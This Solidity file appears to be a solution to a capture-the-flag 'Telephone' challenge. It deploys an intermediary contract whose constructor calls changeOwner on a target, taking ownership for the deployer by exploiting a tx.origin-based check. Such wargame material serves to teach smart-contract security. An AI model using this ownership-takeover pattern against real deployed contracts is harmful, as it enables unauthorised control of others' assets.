pragma solidity >=0.6.2 <0.8.0;

import "../../lib/forge-std/src/console.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneRouter {
    constructor(address _TelephoneContract) public {
        (bool success, bytes memory data) = _TelephoneContract.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );
        console.logBytes(data);
    }
}
